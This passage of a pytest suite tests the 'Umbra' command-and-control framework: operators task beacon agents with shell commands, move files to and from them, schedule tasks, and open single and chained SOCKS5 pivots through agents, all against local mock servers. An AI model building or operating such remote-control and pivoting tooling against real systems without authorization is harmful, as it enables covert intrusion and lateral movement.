    def drop_listen(rel, text):
        if rel.endswith("server.prod.json"):
            return text.replace('"agent_listen": "0.0.0.0:4001",\n', "")
        return text

    code, out = _run_checker("check_consistency.py", drop_listen)
    assert code == 1
    assert "missing required key 'agent_listen'" in out


def test_audit_tail_is_wired_end_to_end():
    """The CLI must expose the audit trail the server records."""
    from umbra_cli import cli, client

    parser = cli.build_parser()
    args = parser.parse_args(["audit", "--limit", "7"])
    assert args.cmd == "audit" and args.limit == 7

    # client.audit() asks for exactly the documented RPC.
    captured = {}

    class Stub:
        def rpc(self, cmd, args=None):
            captured["cmd"] = cmd
            captured["args"] = args

            class R:
                ok = True
                data = {"entries": [], "enabled": True}

            return R()

    assert client.OperatorClient.audit(Stub(), 7) == {"entries": [], "enabled": True}
    assert captured == {"cmd": "audit.tail", "args": {"limit": 7}}


def test_print_audit_marks_failures_and_clips_noise():
    from umbra_cli import cli

    buf = io.StringIO()
    cli.print_audit(
        {
            "enabled": True,
            "entries": [
                {"at": 1700000000, "operator": "alice", "cmd": "task.submit", "ok": True,
                 "agent_id": "web-01", "task_id": "t-1", "ms": 3},
                {"at": 1700000001, "operator": "bob", "cmd": "agents.kill", "ok": False,
                 "err": "no such agent", "ms": 1},
            ],
        },
        stream=buf,
    )
    lines = buf.getvalue().strip().splitlines()
    assert len(lines) == 2
    assert "ok " in lines[0] and "task=t-1" in lines[0]
    assert "ERR" in lines[1] and "no such agent" in lines[1]

    disabled = io.StringIO()
    cli.print_audit({"enabled": False, "entries": []}, stream=disabled)
    assert "disabled" in disabled.getvalue()


def test_consistency_check_detects_a_ci_env_typo():
    """The Android CI job once set UMBRA_SERVER while Gradle reads UMBRA_HOST."""
    def typo_host(rel, text):
        if rel.endswith("ci.yml"):
            return text.replace("UMBRA_HOST: 127.0.0.1", "UMBRA_SERVER: 127.0.0.1")
        return text

    code, out = _run_checker("check_consistency.py", typo_host)
    assert code == 1
    assert "UMBRA_SERVER" in out and "never reads it" in out


def test_audit_and_cancel_against_the_server():
    """The audit trail and task cancellation must work over the real wire."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-audit-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-audit")
    agent.start()

    from umbra_cli.client import OperatorClient, OperatorError

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        assert client.agents(), "agent never registered"

        payload = client.audit(10)
        assert payload["enabled"] is True
        entries = payload["entries"]
        assert entries, "no audit entries recorded"
        # Newest first, and attributed to the connected operator.
        assert entries[0]["operator"] == "alice"
        assert entries[0]["transport"] == "tcp/operator"
        assert any(e["cmd"] == "agents.list" for e in entries)

        # A failing RPC is recorded as a failure, not omitted.
        with pytest.raises(OperatorError):
            client.agent_info("does-not-exist")
        failed = [e for e in client.audit(20)["entries"] if e["cmd"] == "agents.info"]
        assert failed and failed[0]["ok"] is False and failed[0]["err"]

        # Cancelling works once, then reports the truth the second time.
        task_id = client.submit("agent-audit", "shell", {"cmd": "sleep 0.6"})
        client.cancel(task_id)
        with pytest.raises(OperatorError):
            client.cancel(task_id)
        assert client.task(task_id)["state"] in ("cancelled", "done", "failed")
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_operators_list_is_documented_and_served():
    """`umbra operators` needs both sides: the RPC and the table."""
    from umbra_cli import cli, client

    args = cli.build_parser().parse_args(["operators"])
    assert args.cmd == "operators"

    captured = {}

    class Stub:
        def rpc(self, cmd, args=None):
            captured["cmd"] = cmd

            class R:
                ok = True
                data = {"operators": [{"name": "alice"}], "count": 1}

            return R()

    rows = client.OperatorClient.operators(Stub())
    assert captured["cmd"] == "operators.list"
    assert rows == [{"name": "alice"}]

    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        cli.print_operators([{"name": "alice", "peer": "10.0.0.5:1", "transport": "tcp/operator",
                              "since": "2026-01-01T00:00:00Z", "backlog": 0}])
    assert "alice" in buf.getvalue() and "BACKLOG" in buf.getvalue()


def test_operators_list_against_the_mock_server():
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433

    token = b"operator-token-ops-0123456789ab"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    from umbra_cli.client import OperatorClient, OperatorError

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        ops = client.operators()
        assert len(ops) >= 1
        assert ops[0]["transport"] == "tcp/operator"
        assert "backlog" in ops[0]
    finally:
        client.close()
        server.stop()


def test_task_cancel_reaches_the_beacon_before_the_next_batch():
    """0x18 used to be "reserved": the server flipped the store row and nothing
    was ever sent. Now a delivered task's cancel rides the control path, and a
    beacon that does not understand it must not lose the cycle."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-cancel-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-cancel", interval=0.2)
    agent.start()

    from umbra_cli.client import OperatorClient, OperatorError

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        assert client.agents(), "agent never registered"

        # A slow command keeps the task in "delivered" long enough to cancel it
        # while the beacon is holding it.
        task_id = client.submit("agent-cancel", "shell", {"cmd": "sleep 1"})
        deadline = time.time() + 5
        while time.time() < deadline:
            if client.task(task_id)["state"] == "delivered":
                break
            time.sleep(0.02)
        assert client.task(task_id)["state"] == "delivered"

        client.cancel(task_id)

        # The next check-in must carry TASK_CANCEL, and the reference agent must
        # survive it (an unknown control frame used to end the cycle).
        deadline = time.time() + 8
        while time.time() < deadline and task_id not in agent.cancels_received:
            time.sleep(0.05)
        assert task_id in agent.cancels_received, "cancel frame never reached the beacon"

        # The command had already run; its result must not resurrect the task.
        deadline = time.time() + 5
        while time.time() < deadline:
            state = client.task(task_id)["state"]
            if state in ("done", "failed"):
                pytest.fail(f"a cancelled task was re-marked {state}")
            time.sleep(0.05)
        assert client.task(task_id)["state"] == "cancelled"

        # And the beacon keeps working afterwards: an unhandled control frame
        # used to end the cycle before the batch was even read.
        follow = client.submit("agent-cancel", "ping", {})
        assert client.wait_for_result(follow, timeout=10, poll=0.05)["state"] == "done"
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_consistency_check_detects_an_unwritable_deploy_path():
    """ProtectSystem=strict makes an outside path fail only at runtime."""
    def move_audit_to_log(rel, text):
        if rel.endswith("server.prod.json"):
            return text.replace('"/var/lib/umbra/audit.jsonl"', '"/var/log/umbra/audit.jsonl"')
        return text

    code, out = _run_checker("check_consistency.py", move_audit_to_log)
    assert code == 1
    assert "outside the writable paths" in out


def test_consistency_check_detects_an_rbac_drift():
    """A command documented as read-only but enforced as operator is a bug."""
    def promote_task_submit_requirement(rel, text):
        if rel.endswith("rbac.go"):
            # Tolerate gofmt alignment inside the map literal.
            return re.sub(r'"task\.submit":\s+Operator,', '"task.submit": Viewer,', text)
        return text

    code, out = _run_checker("check_consistency.py", promote_task_submit_requirement)
    assert code == 1
    assert "task.submit documented as operator, enforced as viewer" in out


def test_viewer_role_is_enforced_over_the_wire():
    """The reference server refuses writes for a viewer token."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433

    viewer_token = b"viewer-token-0123456789abcd"
    admin_token = b"admin-token-0123456789abcde"
    server = MockServer(
        AGENT_PSK,
        {"watcher": viewer_token, "alice": admin_token},
        roles={"watcher": "viewer"},
    )
    server.start()
    from umbra_cli.client import OperatorClient, OperatorError

    viewer = OperatorClient(server.address, viewer_token.decode(), "watcher")
    admin = OperatorClient(server.address, admin_token.decode(), "alice")
    try:
        viewer.connect()
        admin.connect()

        me = viewer.whoami()
        assert me["role"] == "viewer"
        assert "task.submit" not in me["capabilities"]
        assert "agents.list" in me["capabilities"]

        # Reads are fine.
        assert viewer.agents() == []

        # Writes are refused, and the refusal names the required role.
        with pytest.raises(OperatorError) as excinfo:
            viewer.submit("nobody", "shell", {"cmd": "id"})
        assert "permission denied" in str(excinfo.value)
        assert "operator" in str(excinfo.value)
        with pytest.raises(OperatorError):
            viewer.set_sleep("nobody", 10, 10)

        # Admin-only commands are refused for a plain operator too.
        operator_token = b"operator-token-rbac-01234567"
        server.operators["bob"] = operator_token
        server.roles["bob"] = "operator"
        bob = OperatorClient(server.address, operator_token.decode(), "bob")
        try:
            bob.connect()
            assert bob.whoami()["role"] == "operator"
            with pytest.raises(OperatorError):
                bob.remove_schedule("s-nope")
            # ... but it may read the schedule list.
            assert bob.schedules() == []
        finally:
            bob.close()
    finally:
        viewer.close()
        admin.close()
        server.stop()


def test_operator_chat_is_broadcast_and_kept():
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433

    alice_token = b"chat-token-alice-012345678"
    bob_token = b"chat-token-bob-01234567890"
    server = MockServer(AGENT_PSK, {"alice": alice_token, "bob": bob_token})
    server.start()
    from umbra_cli.client import OperatorClient

    alice = OperatorClient(server.address, alice_token.decode(), "alice")
    bob = OperatorClient(server.address, bob_token.decode(), "bob")
    try:
        alice.connect()
        bob.connect()
        alice.say("moving on web-01")
        bob.say("ack")

        history = alice.chat_history(10)
        assert [m["text"] for m in history] == ["moving on web-01", "ack"]
        assert history[0]["from"] == "alice"

        # Messages are also pushed as events, so a watching console sees them.
        # Earlier events (operator.connected) may be queued ahead of the chat.
        kinds = [bob.next_event(timeout=2.0)["kind"] for _ in range(3)]
        assert "chat" in kinds

        with pytest.raises(Exception):
            alice.say("   ")
    finally:
        alice.close()
        bob.close()
        server.stop()


def test_schedules_fire_tasks():
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"schedule-token-0123456789ab"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-sched", interval=0.2)
    agent.start()
    from umbra_cli.client import OperatorClient, OperatorError

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        assert client.agents()

        created = client.add_schedule("agent-sched", "ping", 5)
        assert created["every"] == 5
        schedule_id = created["schedule_id"]

        rows = client.schedules()
        assert len(rows) == 1 and rows[0]["id"] == schedule_id
        assert rows[0]["by"] == "alice"

        # The interval floor protects the engagement; the server refuses 1s.
        with pytest.raises(OperatorError):
            client.add_schedule("agent-sched", "ping", 1)
        with pytest.raises(OperatorError):
            client.add_schedule("ghost-agent", "ping", 30)

        # Force the next run into the past and wait for the ticker to fire it.
        with server._lock:  # noqa: SLF001 - test double
            server.schedules[schedule_id]["next_run"] = time.time() - 1
        deadline = time.time() + 5
        fired = None
        while time.time() < deadline and fired is None:
            fired = next((t for t in client.tasks("agent-sched") if t["kind"] == "ping"), None)
            time.sleep(0.05)
        assert fired is not None, "schedule never produced a task"

        # And it is removable, which also stops it.
        client.remove_schedule(schedule_id)
        assert client.schedules() == []
        with pytest.raises(OperatorError):
            client.remove_schedule(schedule_id)
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_chunked_download_and_upload_round_trip(tmp_path):
    """A file larger than one chunk survives both directions, hash-verified."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"transfer-token-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-xfer", interval=0.2)
    agent.start()
    from umbra_cli.client import CHUNK_MAX, OperatorClient, OperatorError

    # Comfortably more than one chunk, so the loop has to iterate.
    blob = os.urandom(CHUNK_MAX + 4096)
    remote = tmp_path / "remote.bin"
    remote.write_bytes(blob)
    local = tmp_path / "pulled.bin"

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        assert client.agents()

        seen = []
        info = client.download_file(
            "agent-xfer", str(remote), str(local), chunk=CHUNK_MAX, progress=lambda d, t: seen.append((d, t))
        )
        assert info["chunks"] == 2
        assert info["bytes"] == len(blob)
        assert local.read_bytes() == blob
        assert info["sha256"] == hashlib.sha256(blob).hexdigest()
        # Progress is reported per chunk and the total comes from the beacon.
        assert seen[-1][0] == len(blob) and seen[-1][1] == len(blob)
        # The `.part` file is renamed into place, never left behind.
        assert not (tmp_path / "pulled.bin.part").exists()

        # A missing remote file fails cleanly and leaves no output file.
        with pytest.raises(OperatorError):
            client.download_file("agent-xfer", str(tmp_path / "nope.bin"), str(tmp_path / "nope.out"))
        assert not (tmp_path / "nope.out").exists()

        # Upload the same bytes back under a new name and compare hashes.
        pushed = tmp_path / "pushed.bin"
        up = client.upload_file("agent-xfer", str(local), str(pushed), chunk=CHUNK_MAX)
        assert up["chunks"] == 2
        assert up["sha256"] == hashlib.sha256(blob).hexdigest()
        assert pushed.read_bytes() == blob
    finally:
        client.close()
        server.stop()


def test_upload_rewrites_from_offset_zero(tmp_path):
    """Re-uploading a shorter file must not leave the old tail behind."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"truncate-token-012345678"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-up", interval=0.2)
    agent.start()
    from umbra_cli.client import OperatorClient

    target = tmp_path / "target.bin"
    target.write_bytes(b"A" * 5000)
    source = tmp_path / "source.bin"
    source.write_bytes(b"B" * 100)

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        client.upload_file("agent-up", str(source), str(target))
        assert target.read_bytes() == b"B" * 100
    finally:
        client.close()
        server.stop()


def test_task_result_events_carry_metadata_not_payloads(tmp_path):
    """Events get a bounded preview plus the transfer metadata."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import EVENT_OUTPUT_MAX, FakeAgent, MockServer  # noqa: WPS433

    token = b"preview-token-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-prev", interval=0.2)
    agent.start()
    from umbra_cli.client import OperatorClient

    blob = os.urandom(EVENT_OUTPUT_MAX * 2)  # binary, larger than the preview
    remote = tmp_path / "blob.bin"
    remote.write_bytes(blob)

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        info = client.download_file("agent-prev", str(remote), str(tmp_path / "out.bin"))
        assert (tmp_path / "out.bin").read_bytes() == blob

        result = None
        deadline = time.time() + 5
        while time.time() < deadline and result is None:
            ev = client.next_event(timeout=1.0)
            if ev and ev.get("kind") == "task.result":
                result = ev
        assert result is not None, "no task.result event"

        data = result["data"]
        # Binary payloads are never pushed: only their size is.
        assert "output" not in data and data.get("binary") is True
        assert data.get("size") == info["bytes"]
        assert data["meta"]["sha256"] == info["sha256"]
        assert data["meta"]["eof"] is True
    finally:
        client.close()
        server.stop()


def test_task_claims_order_shared_work(tmp_path):
    """Two operators must not run the same task; a claim is advisory but visible."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    alice_token = b"claim-token-alice-01234567"
    bob_token = b"claim-token-bob-0123456789"
    server = MockServer(AGENT_PSK, {"alice": alice_token, "bob": bob_token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-claim", interval=0.2)
    agent.start()
    from umbra_cli.client import OperatorClient, OperatorError

    alice = OperatorClient(server.address, alice_token.decode(), "alice")
    bob = OperatorClient(server.address, bob_token.decode(), "bob")
    try:
        alice.connect()
        bob.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not alice.agents():
            time.sleep(0.05)

        task_id = alice.submit("agent-claim", "ping", {})
        data = alice.claim(task_id)
        assert data["claimed_by"] == "alice"

        # The claim is part of the task view, so a teammate sees it before
        # duplicating the work.
        assert alice.task(task_id)["claimed_by"] == "alice"

        with pytest.raises(OperatorError) as excinfo:
            bob.claim(task_id)
        assert "claimed by alice" in str(excinfo.value)

        # Claiming twice is a no-op, not an error.
        assert alice.claim(task_id)["claimed_by"] == "alice"

        # Bob cannot release someone else's claim either.
        with pytest.raises(OperatorError):
            bob.release(task_id)

        alice.release(task_id)
        assert "claimed_by" not in alice.task(task_id)
        assert bob.claim(task_id)["claimed_by"] == "bob"
    finally:
        alice.close()
        bob.close()
        server.stop()


def test_claim_is_rejected_once_the_task_is_finished():
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433

    token = b"claim-done-token-012345678"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    from umbra_cli.client import OperatorClient, OperatorError

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        with server._lock:  # noqa: SLF001 - test double
            server.tasks["t-done"] = {
                "id": "t-done", "agent_id": "agent-x", "kind": "ping", "args": {},
                "state": "done", "code": 0, "out": b"pong\n", "err": "",
                "created": time.time(), "completed": time.time(),
            }
        with pytest.raises(OperatorError) as excinfo:
            client.claim("t-done")
        assert "already done" in str(excinfo.value)
    finally:
        client.close()
        server.stop()


def test_focus_is_shared_with_the_team():
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    alice_token = b"focus-token-alice-01234567"
    bob_token = b"focus-token-bob-0123456789"
    server = MockServer(AGENT_PSK, {"alice": alice_token, "bob": bob_token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-focus", interval=0.2)
    agent.start()
    from umbra_cli.client import OperatorClient, OperatorError

    alice = OperatorClient(server.address, alice_token.decode(), "alice")
    bob = OperatorClient(server.address, bob_token.decode(), "bob")
    try:
        alice.connect()
        bob.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not alice.agents():
            time.sleep(0.05)

        alice.focus("agent-focus")
        rows = {o["name"]: o for o in bob.operators()}
        assert rows["alice"]["focus"] == "agent-focus"
        assert "focus_at" in rows["alice"] and rows["alice"]["focus_at"]
        assert "idle_sec" in rows["alice"]

        # The change is pushed, so a console does not have to poll for it.
        kinds = []
        for _ in range(4):
            ev = bob.next_event(timeout=2.0)
            if ev is None:
                break
            kinds.append(ev["kind"])
            if ev["kind"] == "operator.focus":
                assert ev["data"]["agent_id"] == "agent-focus"
                break
        assert "operator.focus" in kinds

        alice.focus("")  # clears it
        rows = {o["name"]: o for o in bob.operators()}
        assert rows["alice"]["focus"] == ""

        with pytest.raises(OperatorError):
            alice.focus("ghost-agent")
    finally:
        alice.close()
        bob.close()
        server.stop()


def test_directed_chat_reaches_only_the_addressee():
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433

    alice_token = b"dm-token-alice-0123456789"
    bob_token = b"dm-token-bob-0123456789ab"
    carol_token = b"dm-token-carol-01234567"
    server = MockServer(AGENT_PSK, {"alice": alice_token, "bob": bob_token, "carol": carol_token})
    server.start()
    from umbra_cli.client import OperatorClient, OperatorError

    alice = OperatorClient(server.address, alice_token.decode(), "alice")
    bob = OperatorClient(server.address, bob_token.decode(), "bob")
    carol = OperatorClient(server.address, carol_token.decode(), "carol")
    try:
        alice.connect()
        bob.connect()
        carol.connect()

        alice.say("web-01 is staged, taking it", to="bob")

        # Bob receives it...
        got = []
        for _ in range(4):
            ev = bob.next_event(timeout=2.0)
            if ev is None:
                break
            got.append(ev)
            if ev["kind"] == "chat":
                break
        assert any(e["kind"] == "chat" and e["data"]["text"].startswith("web-01") for e in got)
        chat_ev = next(e for e in got if e["kind"] == "chat")
        assert chat_ev["data"]["to"] == "bob"

        # ... Carol does not (only her own join events are queued).
        while True:
            ev = carol.next_event(timeout=0.5)
            if ev is None:
                break
            assert ev["kind"] != "chat", ev

        # The history is shared and keeps the recipient, by design.
        history = carol.chat_history(10)
        assert history[-1]["to"] == "bob"

        # Addressing a console that is not connected fails loudly.
        with pytest.raises(OperatorError):
            alice.say("anyone?", to="dave")
    finally:
        alice.close()
        bob.close()
        carol.close()
        server.stop()


# ---------------------------------------------------------------------------
# pivoting, the layer-3 tunnel and the extension store
# ---------------------------------------------------------------------------
def _echo_server() -> Tuple[socket.socket, threading.Thread, List[bytes]]:
    """A tiny TCP echo server: the target the pivot has to reach."""
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind(("127.0.0.1", 0))
    listener.listen(4)
    seen: List[bytes] = []

    def handle(conn: socket.socket) -> None:
        """One connection at a time: the pivot opens a new one per stream."""
        with conn:
            while True:
                data = conn.recv(4096)
                if not data:
                    break
                seen.append(data)
                conn.sendall(data)

    def serve() -> None:
        while True:
            try:
                conn, _ = listener.accept()
            except OSError:
                return
            # Every connection gets its own thread: a pivot that opens a
            # second stream while the first one is still open must not
            # wait for it.
            threading.Thread(target=handle, args=(conn,), daemon=True).start()

    thread = threading.Thread(target=serve, daemon=True)
    thread.start()
    return listener, thread, seen


def _recv_exact(conn: socket.socket, n: int) -> bytes:
    """Read exactly n bytes.

    A plain recv() can return less than asked for, and the SOCKS5 replies of
    the server may arrive in one segment: reading them apart keeps the test
    honest about the wire format.
    """
    buf = b""
    while len(buf) < n:
        chunk = conn.recv(n - len(buf))
        if not chunk:
            raise AssertionError("the connection closed early")
        buf += chunk
    return buf


def _socks5_connect(proxy_host: str, proxy_port: int, host: str, port: int) -> socket.socket:
    """Open a SOCKS5 tunnel through the proxy to `host:port`.

    The proxy address and the target are two different things: the client
    connects to the proxy and asks it to reach the target.
    """
    proxy_port = int(proxy_port)
    port = int(port)
    conn = socket.create_connection((proxy_host, proxy_port), timeout=10)
    conn.sendall(b"\x05\x01\x00")
    assert _recv_exact(conn, 2) == b"\x05\x00"
    conn.sendall(b"\x05\x01\x00\x01" + socket.inet_aton(host) + port.to_bytes(2, "big"))
    reply = _recv_exact(conn, 10)
    assert reply[1] == 0x00, reply
    return conn


def test_pivot_socks5_reaches_a_target_through_the_agent():
    """The whole pivot path: operator -> server -> agent -> target."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    target, _, seen = _echo_server()
    target_host, target_port = target.getsockname()

    token = b"operator-token-pivot-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-pivot")
    agent.start()

    from umbra_cli.client import OperatorClient, OperatorError

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        assert client.agents()

        # The server asks the agent for a callback session and then for the
        # target; the agent dials back on its own.
        tunnel = client.pivot_open("agent-pivot", mode="socks")
        assert tunnel["mode"] == "socks"
        assert tunnel["listen"].startswith("127.0.0.1:")

        conn = _socks5_connect(
            *tunnel["listen"].rsplit(":", 1),
            "127.0.0.1", target_port,
        )
        conn.sendall(b"pivot-hello")
        assert conn.recv(64) == b"pivot-hello"
        conn.close()

        assert seen and seen[0] == b"pivot-hello"

        # The tunnel is visible in the list and can be closed again.
        tunnels = client.pivot_list()
        assert any(t["stream"] == tunnel["stream"] for t in tunnels)
        client.pivot_close(tunnel["stream"])
        assert all(t["stream"] != tunnel["stream"] for t in client.pivot_list())
    finally:
        client.close()
        agent.stop()
        server.stop()
        target.close()


def test_pivot_refuses_an_unknown_agent():
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433

    token = b"operator-token-pivot-2-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()

    from umbra_cli.client import OperatorClient, OperatorError

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        with pytest.raises(OperatorError):
            client.pivot_open("nobody")
    finally:
        client.close()
        server.stop()


def test_a_pivot_can_be_chained_through_another_agent():
    """A pivot through a pivot: the operator names the far end only.

    The path is server -> agent A -> agent B -> target.  The server asks A
    for a stream to B, then plays the peer link on it and asks B for the
    stream to the target.  Nothing but the far end is named by the operator.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    target, _, seen = _echo_server()
    target_host, target_port = target.getsockname()

    token = b"operator-token-chain-012345678"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    # The first hop only relays; the second one waits for peers.
    first = FakeAgent(server.address, AGENT_PSK, "agent-first")
    second = FakeAgent(server.address, AGENT_PSK, "agent-second",
                       peer_listen="127.0.0.1:0")
    first.start()
    second.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 10
        peers = ""
        while time.time() < deadline:
            for agent in client.agents():
                if agent["id"] == "agent-second":
                    peers = str(agent.get("p2p", "") or "")
            if peers:
                break
            time.sleep(0.05)
        assert peers, "the second agent never reported its peer address"

        tunnel = client.pivot_open("agent-first", mode="socks", path=["agent-second"])
        assert tunnel.get("path") == ["agent-second"]

        conn = _socks5_connect(*tunnel["listen"].rsplit(":", 1),
                               "127.0.0.1", target_port)
        conn.sendall(b"chained")
        assert conn.recv(64) == b"chained"
        conn.close()
        assert b"chained" in seen
    finally:
        client.close()
        first.stop()
        second.stop()
        server.stop()
        target.close()


def test_the_peer_link_refuses_a_stranger() -> None:
    """The peer link only answers the holder of the agent key.

    The handshake proves the key in both directions: a beacon that does
    not hold it cannot join the link, so a host that reaches the peer
    port gains nothing.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-peer-012345678"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-peer",
                      peer_listen="127.0.0.1:0")
    agent.start()
    try:
        deadline = time.time() + 10
        while time.time() < deadline and not agent.peer_address:
            time.sleep(0.05)
        assert agent.peer_address, "the agent never bound its peer listener"

        from umbra_cli import peer

        host, _, port = agent.peer_address.rpartition(":")
        # The right key: the handshake goes through.
        sock = socket.create_connection((host, int(port)), timeout=10)
        try:
            sess = peer.dial_peer(netio.SocketBytes(sock), AGENT_PSK, "tester")
            assert sess is not None
        finally:
            sock.close()

        # The wrong key: the peer refuses the transcript.
        sock = socket.create_connection((host, int(port)), timeout=10)
        try:
            with pytest.raises(Exception):
                peer.dial_peer(netio.SocketBytes(sock), b"\x00" * 32, "tester")
        finally:
            sock.close()
    finally:
        agent.stop()
        server.stop()


def test_a_chained_pivot_falls_back_to_the_server_when_the_peer_is_down() -> None:
    """A broken peer link must not break the pivot.

    When the peer handshake fails, the server takes the hop over itself:
    the operator still reaches the target, only the traffic takes another
    road.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    target, _, seen = _echo_server()
    target_host, target_port = target.getsockname()

    token = b"operator-token-fall-012345678"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    first = FakeAgent(server.address, AGENT_PSK, "agent-first")
    # The peer listener of the second agent waits with another key: the
    # peer link cannot be established.
    second = FakeAgent(server.address, AGENT_PSK, "agent-second",
                       peer_listen="127.0.0.1:0", peer_psk=b"\x11" * 32)
    first.start()
    second.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 10
        peers = ""
        while time.time() < deadline:
            for agent in client.agents():
                if agent["id"] == "agent-second":
                    peers = str(agent.get("p2p", "") or "")
            if peers:
                break
            time.sleep(0.05)
        assert peers, "the second agent never reported its peer address"

        tunnel = client.pivot_open("agent-first", mode="socks", path=["agent-second"])
        assert tunnel.get("path") == ["agent-second"]

        conn = _socks5_connect(*tunnel["listen"].rsplit(":", 1),
                               "127.0.0.1", target_port)
        conn.sendall(b"fallback")
        assert conn.recv(64) == b"fallback"
        conn.close()
        assert b"fallback" in seen
    finally:
        client.close()
        first.stop()
        second.stop()
        server.stop()
        target.close()


def _socks5_connect_auth(proxy_host: str, proxy_port: int, host: str, port: int,
                         user: str, password: str) -> socket.socket:
    """Open a SOCKS5 tunnel through a proxy that asks for credentials."""
    conn = socket.create_connection((proxy_host, int(proxy_port)), timeout=10)
    conn.sendall(b"\x05\x01\x02")
    assert _recv_exact(conn, 2) == b"\x05\x02"
    name = user.encode()
    secret = password.encode()
    conn.sendall(b"\x01" + bytes([len(name)]) + name +
                 bytes([len(secret)]) + secret)
    assert _recv_exact(conn, 2) == b"\x01\x00"
    conn.sendall(b"\x05\x01\x00\x01" + socket.inet_aton(host) +
                 int(port).to_bytes(2, "big"))
    reply = _recv_exact(conn, 10)
    assert reply[1] == 0x00, reply
    return conn


def _pivot_client(server, token, agent_id="agent-reach"):
    """A console and an agent that is ready to be pivoted through."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent  # noqa: WPS433

    from umbra_cli.client import OperatorClient

    agent = FakeAgent(server.address, AGENT_PSK, agent_id)
    agent.start()
    client = OperatorClient(server.address, token.decode(), "alice")
    client.connect()
    deadline = time.time() + 5
    while time.time() < deadline and not client.agents():
        time.sleep(0.05)
